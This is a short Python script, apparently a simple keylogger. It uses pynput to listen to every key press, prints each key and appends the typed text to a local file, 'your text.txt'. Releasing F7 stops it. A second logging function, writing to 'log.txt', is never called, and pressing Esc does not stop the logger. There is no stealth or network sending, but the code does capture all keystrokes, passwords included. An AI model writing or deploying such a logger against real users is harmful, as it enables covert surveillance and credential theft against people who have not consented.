import pynput
from pynput.keyboard import Key, Listener

keys = []
count = 0


def on(key):
    print("{0} pressed".format(key))
    if key == Key.esc:
        return 0
    global count, keys
    keys.append(key)
    count += 1
    if count >= 1:
        with open("your text.txt", "a") as f:
            for i in keys:
                k = str(i).replace("'", "")
                if k.find("enter") > 0:
                    f.write('\n')
                elif k.find("space") > 0:
                    f.write(" ")
                elif k.find("Key") == -1:
                    f.write(k)
        keys = []


def off(key):
    if key == Key.f7:
        return False


def write_file(keys):
    with open("log.txt", "a") as f:
       for i in keys:
            k = str(i).replace("'", "")
            if k.find("enter") > 0:
                f.write('\n')
            elif k.find("space") > 0:
               f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)


with Listener(on_press=on, on_release=off) as listener:
    listener.join()
